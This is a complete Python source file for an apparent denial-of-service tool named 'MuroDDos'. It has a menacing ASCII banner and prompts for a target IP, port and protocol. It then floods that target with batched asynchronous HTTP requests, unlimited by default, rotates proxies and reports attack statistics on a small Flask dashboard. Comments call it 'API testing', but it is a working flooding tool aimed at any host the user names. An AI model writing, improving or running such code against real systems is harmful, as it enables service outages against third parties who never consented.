import aiohttp
import asyncio
import os
import random
import csv
import json
import time
import logging
import gc
from colorama import Fore, init
from aiohttp import ClientSession, ClientConnectorError, ClientTimeout
from flask import Flask, jsonify

# Initialize colorama for colored output
init(autoreset=True)

# Clear screen and show banner
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.RED}
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⠟⠁⠀⠀⠀⠹⣿⣿⣿⣿⣿⠟⠁⠀⠀⠹⣿⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢼⣿⠀⢿⣿⣿⣿⣿⠀⣾⣷⠀⠀⢿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣷⡀⠀⠀⠈⠋⢀⣿⣿⣿⣿⣿⡀⠙⠋⠀⢀⣾⣿⣿⠀⠀⠀⠀⠀⠀
⢀⣀⣀⣀⣿⣿⣿⣿⣿⣶⣶⣶⣶⣿⣿⣿⣿⣾⣿⣷⣦⣤⣴⣿⣿⣿⣿⣤⠤⢤⣤⡄⠀
⠈⠉⠉⢉⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣀⣀⣀⡀⠀⠀
⠐⠚⠋⠉⢀⣬⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣥⣀⡀⠈⠀⠈⠛⠀
⠀⠀⠴⠚⠉⠀⠀⠀⠉⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠉⠛⠢⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
{Fore.RESET}""")

# Initialize logging
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

class MuroDDos:
    def __init__(self):
        self.counter = 0
        self.success_count = 0
        self.failure_count = 0
        self.running = True
        self.proxies = [
            "http://proxy1:port",
            "http://proxy2:port",  # Add your proxies here
        ]
        self.max_retries = 3  # Maximum retry attempts
        self.batch_size = 1000  # Number of requests per batch
        self.connector_limit = 1000  # Optimal connection limit
        self.session = None  # Static session for reuse
        self.timeout = 5  # Default timeout in seconds
        self.delay = 0  # Delay between requests
        self.total_requests = 0  # Total requests to send
        self.threads = 1  # Number of threads (concurrent tasks)
        self.log_file = "attack_logs.csv"  # Log file for responses
        self.ssl = False  # SSL support for HTTPS
        self.headers = {"Content-Type": "application/json"}  # Default headers for API testing
        self.data = {"username": "test", "password": "1234"}  # Default data for API testing

    async def send_request(self, url, method="GET", proxy=None):
        retries = 0
        while retries < self.max_retries:
            try:
                async with self.session.request(method, url, proxy=proxy, timeout=ClientTimeout(total=self.timeout), headers=self.headers, json=self.data) as response:
                    self.counter += 1
                    if response.status == 200:
                        self.success_count += 1
                        print(f"{Fore.GREEN}[+] {Fore.WHITE}Request {self.counter} succeeded!")
                    else:
                        self.failure_count += 1
                        print(f"{Fore.RED}[-] {Fore.WHITE}Request {self.counter} failed with status {response.status}")
                    self.log_response(response.status, url)  # Log the response
                    return  # Exit on success or failure
            except (ClientConnectorError, asyncio.TimeoutError) as e:
                retries += 1
                print(f"{Fore.YELLOW}[!] {Fore.WHITE}Retry {retries}/{self.max_retries} for request {self.counter}")
                await asyncio.sleep(retries * 2)  # Exponential backoff
            except Exception as e:
                self.failure_count += 1
                print(f"{Fore.RED}[-] {Fore.WHITE}Request failed: {str(e)}")
                self.log_response("FAILED", url)  # Log the failure
                return
        self.failure_count += 1

    def log_response(self, response_status, url):
        with open(self.log_file, mode="a", newline="") as file:
            writer = csv.writer(file)
            writer.writerow([url, response_status])
        logging.info(f"Request to {url} - Status: {response_status}")

    async def attack(self, url, method="GET"):
        connector = aiohttp.TCPConnector(limit=self.connector_limit, ssl=self.ssl)  # Optimal connection limit
        self.session = ClientSession(connector=connector)
        start_time = time.time()
        while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
            tasks = []
            for _ in range(self.batch_size):
                if self.total_requests > 0 and self.counter >= self.total_requests:
                    break
                proxy = self.proxies[random.randint(0, len(self.proxies)-1)] if self.proxies else None
                tasks.append(asyncio.create_task(self.send_request(url, method, proxy)))
                delay = random.uniform(0.1, 2)  # Random delay between 0.1 and 2 seconds
                await asyncio.sleep(delay)  # Execute delay
            await asyncio.gather(*tasks)
            gc.collect()  # Garbage collection to manage memory
        elapsed_time = time.time() - start_time
        print(f"{Fore.YELLOW}[+] {Fore.WHITE}Attack completed in {elapsed_time:.2f} seconds!")
        self.generate_report(elapsed_time)

    def generate_report(self, elapsed_time):
        report = {
            "total_requests": self.counter,
            "successful_requests": self.success_count,
            "failed_requests": self.failure_count,
            "time_taken": elapsed_time,
            "requests_per_second": self.counter / elapsed_time if elapsed_time > 0 else 0
        }
        print(f"{Fore.CYAN}[+] {Fore.WHITE}Report: {json.dumps(report, indent=4)}")
        with open("performance_report.json", "w") as file:
            json.dump(report, file, indent=4)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.run(self.session.close())

# Flask Dashboard
app = Flask(__name__)
muro = MuroDDos()

@app.route('/status')
def status():
    return jsonify({
        "success": muro.success_count,
        "failed": muro.failure_count,
        "total_requests": muro.counter
    })

def run_dashboard():
    app.run(port=5000)

async def main():
    clear_screen()
    target_ip = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter target IP: ")
    target_port = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter target port (default 80): ") or "80"
    protocol = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter protocol (HTTP/HTTPS/WS, default HTTP): ") or "HTTP"
    method = input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter request method (GET, POST, HEAD): ") or "GET"
    total_requests = int(input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter total requests (0 for unlimited): ") or 0)
    threads = int(input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter number of threads (default 1): ") or 1)
    timeout = int(input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter timeout per request (default 5 seconds): ") or 5)
    delay = float(input(f"{Fore.CYAN}[?] {Fore.WHITE}Enter delay between requests (default 0 seconds): ") or 0)
    use_ssl = input(f"{Fore.CYAN}[?] {Fore.WHITE}Use SSL (y/n, default n): ") or "n"
    use_dashboard = input(f"{Fore.CYAN}[?] {Fore.WHITE}Run Dashboard (y/n, default n): ") or "n"

    url = f"{protocol.lower()}://{target_ip}:{target_port}"
    muro.total_requests = total_requests
    muro.threads = threads
    muro.timeout = timeout
    muro.delay = delay
    muro.ssl = use_ssl.lower() == "y"

    print(f"\n{Fore.YELLOW}[!] {Fore.WHITE}Attack started! Press Ctrl+C to stop\n")

    if use_dashboard.lower() == "y":
        import threading
        threading.Thread(target=run_dashboard, daemon=True).start()

    try:
        await muro.attack(url, method)
    except asyncio.CancelledError:
        muro.stop()
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack stopped!")
        print(f"{Fore.YELLOW}[+] {Fore.WHITE}Total Requests: {muro.counter}")
        print(f"{Fore.GREEN}[+] {Fore.WHITE}Successful Requests: {muro.success_count}")
        print(f"{Fore.RED}[-] {Fore.WHITE}Failed Requests: {muro.failure_count}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] {Fore.WHITE}Attack terminated by user!")
